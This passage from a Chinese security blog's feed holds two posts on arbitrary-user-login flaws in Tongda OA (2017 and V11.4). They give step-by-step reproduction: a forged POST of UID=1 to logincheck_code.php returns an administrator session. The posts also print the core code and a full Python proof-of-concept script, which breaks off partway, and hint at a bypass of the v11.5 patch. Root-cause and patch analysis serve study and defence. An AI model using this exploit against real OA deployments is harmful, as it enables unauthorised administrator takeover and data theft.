    <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>通达OA系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。<br>Office Anywhere采用基于WEB的企业计算，主HTTP服务器采用了世界上最先进的<br>Apache服务器，性能稳定可靠。数据存取集中控制，避免了数据泄漏的可能。提供数据备份工具，保护系统数据安全。多级的权限控制，完善的密码验证与登录验证机制更加强了系统安全性。</p><p>未经授权的攻击者通过构造请求包实现用户登录，又由于UID是主键且步进为1递增，从而导致可以指定UID实现任意用户登录（admin的缺省UID为1）。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p><strong>官网</strong>：<a href="https://www.tongda2000.com/">https://www.tongda2000.com/</a></p><p><strong>下载</strong>：链接：<a href="https://pan.baidu.com/s/1RLoz7wUZc0Hr9S7aBoxYew">https://pan.baidu.com/s/1RLoz7wUZc0Hr9S7aBoxYew</a>  提取码：thcz </p><p><strong>版本</strong>：<br>通达OA 2017版</p><p><strong>测试系统</strong>：<br>Windows 7 家庭版 64位操作系统<br>Windows 10 教育版（攻击机）</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol><li><p>使用burp拦截，访问/logincheck_code.php，burp断下后修改如下：</p><p>a) GET请求修改为POST请求</p><p>b) 删除Cookie字段</p><p>c）添加请求体UID=1</p><p>d) 添加Content-Type: application/x-www-form-urlencoded</p></li></ol><p>经过测试，使用app扫码登录时，可以捕获到/logincheck_code.php这一条数据包。</p><p>  <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201218222452591_18400.png"></p><ol start="2"><li><p>该请求成功后会返回一个管理员cookie</p></li><li><p>访问后台<br>  后台首页地址是：<a href="http://192.168.3.116/general/index.php?isIE=0&amp;modify_pwd=0%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%B8%A6%E4%B8%8A%E4%B8%8A%E4%B8%80%E6%AD%A5%E8%BF%94%E5%9B%9E%E7%9A%84cookie%E8%AE%BF%E9%97%AE%E8%AF%A5%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%B0%B1%E5%AE%9E%E7%8E%B0%E4%BA%86%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BA%86%EF%BC%8C%E6%9D%83%E9%99%90%E6%98%AF%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98">http://192.168.3.116/general/index.php?isIE=0&amp;modify_pwd=0，直接带上上一步返回的cookie访问该地址，就实现了任意用户登录了，权限是系统管理员</a></p><pre><code>![](https://gitee.com/tutucoo/images/raw/master/uPic/20201218223410777_1046.png)</code></pre><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>通过漏洞复现，可以得知，漏洞点存在于logincheck_code.php，解密源码后找到logincheck_code.php<br>可以看到UID参数可控，通过POST请求获取<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201218211816972_32338.png"></p></li></ol><p>然后会根据UID获取数据库中的数据</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201218223521831_25668.png"></p><p>判断是否是被禁用户</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201218223619974_23797.png"></p><p>记录被ban用户尝试登录次数</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201218223825516_24615.png"></p><p>被ban用户第一次登录会收到提醒，第二次以后会设置ban的过期时间</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201218224021687_9206.png"></p><p>之后都是一些多端登录之类的操作，有兴趣可以自己看一看，关键的还是在后面。<br>180行可以看到UID被保存到session中，这样，有可控参数，并且这个可控参数会被保存到session，这就可能存在任意用户登录了，我们可以合理猜测，只要构造一个管理员UID，系统就会通过cookie返回管理员的sessionid，之后再通过该sessionid登录就可以实现任意用户登录了。</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201218212335531_14646.png"></p><p>网上看到该地址存在的漏洞需要构造UID=1&amp;CODEUID=_PC{xxxxxxxx}，并通过访问/ispirit/login_code.php获取codeuid，但是通过查看通达2017源码可以看到，它并没有检测codeuid，直接构造一个UID即可</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从白盒角度来看，可以通过源码中找到可控输入参数，如果这个参数还会被保存为session，就可以猜测存在任意用户登录。<br>通过源码构造poc，这里是通过POST接收参数，因此请求采用POST，另外需要UID，可以合理猜测UID=1是管理员，这也可通过本地数据库进行验证。</p><p>POST请求通常还需要请求头Content-Type，Content-Type有以下几种类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">application&#x2F;x-www-form-urlencoded 在发送前编码所有字符（默认）</span><br><span class="line">multipart&#x2F;form-data 不对字符编码,在使用包含文件上传控件的表单时，必须使用该值。</span><br><span class="line">text&#x2F;plain 空格转换为 &quot;+&quot; 加号，但不对特殊字符编码。</span><br></pre></td></tr></table></figure><p>通常测试任意用户登录使用的是x-www-form-urlencoded，此外，还可以测试带上Content-Length: 100，有时候服务器会对该字段进行检测。<br>从黑盒的角度来看，如果在测试过程中看到login_code_check这样的地址，看英文意思也能猜出是用于登录检测了，那么就是任意用户登录高发的位置了，如果请求体中还包含了UID，不妨试一下UID=1，再通过返回的cookie直接访问后台地址，如果可以正常访问，那么就是任意用户登录了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h2&gt;&lt;p&gt;通达OA系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。&lt;br&gt;Office Anywhere采用</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>通达 OA Office Anywhere V11.4任意用户登录漏洞复现与原理详细解析</title>
    <link href="https://tutucoo.github.io/2020/12/13/%E9%80%9A%E8%BE%BE%20OA%20Office%20Anywhere%20v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"/>
    <id>https://tutucoo.github.io/2020/12/13/%E9%80%9A%E8%BE%BE%20OA%20Office%20Anywhere%20v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/</id>
    <published>2020-12-13T05:51:03.000Z</published>
    <updated>2021-10-08T07:52:05.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>通达OA系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。<br>Office Anywhere采用基于WEB的企业计算，主HTTP服务器采用了世界上最先进的<br>Apache服务器，性能稳定可靠。数据存取集中控制，避免了数据泄漏的可能。提供数据备份工具，保护系统数据安全。多级的权限控制，完善的密码验证与登录验证机制更加强了系统安全性。</p><p>通达OA官方更新了V11版本安全补丁，修复了任意用户伪造登录漏洞，该漏洞的操作难度低，危害程度大。未经授权的攻击者通过构造请求包实现用户登录，又由于UID是主键且步进为1递增，从而导致可以指定UID实现任意用户登录（admin的缺省UID为1）。</p><h2 id="2-漏洞环境"><a href="#2-漏洞环境" class="headerlink" title="2. 漏洞环境"></a>2. 漏洞环境</h2><p><strong>官网</strong>：<a href="https://www.tongda2000.com/">https://www.tongda2000.com/</a></p><p><strong>下载</strong>：<a href="https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe">https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe</a></p><p><strong>版本</strong>：通达OA V11.X&lt;V11.5</p><p><strong>测试系统</strong>：<br>Windows 7 专业版 64位操作系统<br>macOS11.0.1<br>python3.7.5</p><h2 id="3-漏洞验证"><a href="#3-漏洞验证" class="headerlink" title="3. 漏洞验证"></a>3. 漏洞验证</h2><ul><li><p>下载并执行poc</p><p>进入这个地址下载poc:<a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a><br>执行poc，poc如果顺利执行会返回cookie<br> <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201205132816162_824661327.png"></p></li><li><p>任意用户登录</p><p>打开burp，开启代理，访问<a href="http://192.168.3.104/general/index.php?isIE=0&amp;modify_pwd=0%EF%BC%8C%E6%9B%BF%E6%8D%A2cookie%E4%B8%AD%E7%9A%84PHPSESSID%E5%8F%82%E6%95%B0%E4%B8%BAPOC%E8%84%9A%E6%9C%AC%E8%BF%90%E8%A1%8C%E8%8E%B7%E5%8F%96%E7%9A%84sessionid%EF%BC%8C%E7%84%B6%E5%90%8E%E6%94%BE%E5%8C%85">http://192.168.3.104/general/index.php?isIE=0&amp;modify_pwd=0，替换cookie中的PHPSESSID参数为POC脚本运行获取的sessionid，然后放包</a><br>   <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201205132835095_223465151.png"></p></li><li><p>切换到浏览器，可以看到已经使用系统管理员身份登录了后台<br> <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201205133237726_1977377901.png"></p></li></ul><h2 id="4-漏洞原理"><a href="#4-漏洞原理" class="headerlink" title="4. 漏洞原理"></a>4. 漏洞原理</h2><p>POC的主要流程:</p><ol><li>首先会发送一条GET请求到/general/login_code.php，在其响应包中获取到其中的一串codeuid</li><li>发送一条POST请求到/logincheck_code.php，在其请求体中添加上一步获取到的codeuid以及uid=1，这里uid=1代表的是管理员权限，发送成功后会在其响应包中获取Cookie值，经过测试，使用app扫描登录时可以捕获到这条包</li><li>最后发送一条GET请求到/general/index.php，Cookie修改为上一步获取到的cookie值，然后就可以成功伪造身份并以管理员身份进入后台<br>POC核心代码如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    ...</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">headers=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getV11Session</span>(<span class="params">url</span>):</span></span><br><span class="line">    checkUrl = url+<span class="string">&#x27;/general/login_code.php&#x27;</span> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers[<span class="string">&quot;User-Agent&quot;</span>] = choice(USER_AGENTS) <span class="comment">#随机挑选列表中的UserAgent</span></span><br><span class="line">        res = requests.get(checkUrl,headers=headers) <span class="comment">#通过组合checkUrl和UserAgent，发起一个get请求</span></span><br><span class="line">        resText = <span class="built_in">str</span>(res.text).split(<span class="string">&#x27;&#123;&#x27;</span>) <span class="comment">#分解请求的返回包，以&#123;为界限</span></span><br><span class="line">        codeUid = resText[-<span class="number">1</span>].replace(<span class="string">&#x27;&#125;&quot;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment">#获取返回包中的一串codeuid</span></span><br><span class="line">        getSessUrl = url+<span class="string">&#x27;/logincheck_code.php&#x27;</span></span><br><span class="line">        <span class="comment">#通过得到的的codeuid和uid，发送一个post请求到logincheck_code.php</span></span><br><span class="line">        res = requests.post(</span><br><span class="line">            getSessUrl, data=&#123;<span class="string">&#x27;CODEUID&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>+codeUid+<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;UID&#x27;</span>: <span class="built_in">int</span>(<span class="number">1</span>)&#125;,headers=headers)</span><br><span class="line">        tmp_cookie = res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]<span class="comment">#该POST请求返回了设置cookie的请求</span></span><br><span class="line">        headers[<span class="string">&quot;User-Agent&quot;</span>] = choice(USER_AGENTS) <span class="comment">#重新选择一个UserAgent</span></span><br><span class="line">        headers[<span class="string">&quot;Cookie&quot;</span>] = tmp_cookie <span class="comment">#设置新的cookie</span></span><br><span class="line">        <span class="comment">#最后通过拼接UserAgent以及Cookie发送一个get请求到general/index.php</span></span><br><span class="line">        check_available = requests.get(url + <span class="string">&#x27;/general/index.php&#x27;</span>,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;用户未登录&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> check_available.text:<span class="comment"># 返回包如果不包含“用户未登录”这样的字眼表示登录成功</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;重新登录&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> check_available.text:</span><br><span class="line">                print(<span class="string">&#x27;[+]Get Available COOKIE:&#x27;</span> + tmp_cookie)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;[-]Something Wrong With &#x27;</span> + url + <span class="string">&#x27;,Maybe Not Vulnerable.&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27;[-]Something Wrong With &#x27;</span>+url)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>接下来，演示一下手动获取cookie，并实现任意用户登录<br>burp拦截打开，直接访问/general/login_code.php，拦截返回包，在返回包中可以看到返回的codeuid，保存起来，后面要用<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206130617360_586178304.png"><br>接着访问/logincheck_code.php，删去Cookie，data部分修改为CODEUID={xxx}&amp;UID=1，这里codeuid要填写上一步获取到的codeuid，如下图所示：</li></ol><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206131513403_553316630.png"><br>如果请求参数正确，返回包里的msg字段为空，否则会提示“参数不正确”，此时保存Set-Cookie里面的值，后面要用<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206131334282_1214772437.png"><br>最后访问/general/index.php，修改Cookie为上一步Set-Cookie的值1rp2qql0p3uloi87o7ogua6g32，点击forward获取到返回包，可以后台中包含的字眼了，如果请求失败，会返回“用户未登录”</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206132533523_740749525.png"><br>放出这条包，跳转到浏览器就可以直接进入后台了<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206133401538_814565016.png"></p><p>再通过源码了解下引起漏洞的原因是什么，所在php文件是logincheck_code.php，根据访问地址，可知logincheck_code.php在根目录下，找到该文件打开<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206201705889_1081135224.png"><br>直接打开文件看源码，乱码，显然是加密，通过文件头的标识Zend可知，加密方式为Zend加密<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206201807907_780572501.png"><br>不过Zend加密已经有相关的解密的工具，这里提供下载：<br><a href="https://pan.baidu.com/s/1OdV5YxmNarmCVMZWYy4AuQ">https://pan.baidu.com/s/1OdV5YxmNarmCVMZWYy4AuQ</a><br>提取码：hw7o<br>工具使用方法也是傻瓜式的，很容易使用，这里就不进行演示了。<br>解密后可以看到文件内部的代码了，下面进行代码审计<br>可以看到logincheck_code.php的UID参数是可控的<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206222103129_104424784.png"><br>最重要的部分如下，系统通过获取到UID，再存储到session中，上面可以通过POST参数控制UID输入，有了可控输入和缓存，这就满足了用户伪造的两个重要的条件<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206222425782_573205089.png"><br>那么请求中为什么还需要CODEUID参数呢？翻一下文件可以看到有个if判断，如果login_codeuid为空就会提示“参数错误！”，而login_codeuid来自于get_cache，也就是说要获取CODEUID需要先设置cache，这样才能获得CODEUID。<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206224536532_246290381.png"><br>这个值应该也是由服务端返回，在源码中进行搜索，可以看到很多的结果，可以看到login_code.php（general/login_code和ispirit/login_code均可返回CODEUID），而POC中第一个发起的请求就是发往login_code.php，可见第一个请求的目的就是通过这个请求获取到CODEUID了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206230341634_1201445698.png"><br>它是如何返回CODEUID的呢？我们以ispirit文件夹下的login_code.php为例进行查看<br>它会从参数codeuid获取值，如果没有传递codeuid，就会随机生成一个codeuid，最后通过echo显示，也就是说直接访问这个地址，就可以查看到codeuid了<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206231302417_1479707479.png"><br>login_code在ispirit文件夹下，直接访问，果然返回了codeuid<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206230910699_2056597192.png"><br>（另外一个文件general/login_code是通过返回二维码的形式将CODEUID返回的。）<br>这样，我们就得到了codeuid，现在就可以发送POST请求到logincheck_code了，通过它的响应包获取到了cookie，由于请求中的UID的值是1，也就是管理员，在发请求时将未登录cookie删除，服务端就会返回一个管理员的cookie了，这样再通过访问/general/index.php，也就是后台的首页地址，就可以实现任意用户登录了。<br>那么如何知道user=1就是管理员呢？<br>通达本地部署了一个mysql数据库，通过访问数据库就可以知道uid的存储情况<br>进入通达OA根目录，在mysql5目录下找到my.ini，里面有密码<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206231929803_1582967293.png"><br>进入bin文件夹下，右键打开控制台输入命令登录数据库</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206232404664_910952605.png"><br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206232437982_969512772.png"><br>查询数据库，可以看到uid=1的用户是admin<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206232557583_1642729215.png"></p><h2 id="4-补丁分析"><a href="#4-补丁分析" class="headerlink" title="4. 补丁分析"></a>4. 补丁分析</h2><p>分析v11.5版本的源码，找到logincheck_code.php，可以看到不再接收UID参数了，而是转为接收TOKEN，然后把token作为key获取值，再对这个值进行解密，最后从解密后的数据中取出UID，解决了UID可控的问题，但是可以通过找到一处设置OA:authcode:token:的地方，或者找到一个可以控制键值的缓存，即可绕过</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/image-20201219213424781.png" alt="image-20201219213424781"></p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>通达OA任意用户登录（伪造）是一个比较典型的任意用户登录漏洞，因此作为学习这类漏洞的案例还是比较有代表性的。<br>漏洞利用过程也比较简单，需要关注的是，在具备了可控输入参数UID和UID缓存到session中这两个条件时，就可能存在任意用户伪造漏洞了，再通过代码审计可知，需要codeuid的值，通过代码引用回溯，定位到获取codeuid的方法，最后通过发起存在漏洞点的请求获取到管理员cookie，然后在未登录的情况下访问后台时带上这个cookie，就可以实现以管理员的身份登录了，如果uid递增，也就是系统中存在的其他用户，也就实现了任意用户登录了。</p><h2 id="附：POC"><a href="#附：POC" class="headerlink" title="附：POC"></a>附：POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@Author         : Sp4ce</span></span><br><span class="line"><span class="string">@Date           : 2020-03-17 23:42:16</span></span><br><span class="line"><span class="string">LastEditors    : Sp4ce</span></span><br><span class="line"><span class="string">LastEditTime   : 2020-08-27 10:21:44</span></span><br><span class="line"><span class="string">@Description    : Challenge Everything.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media 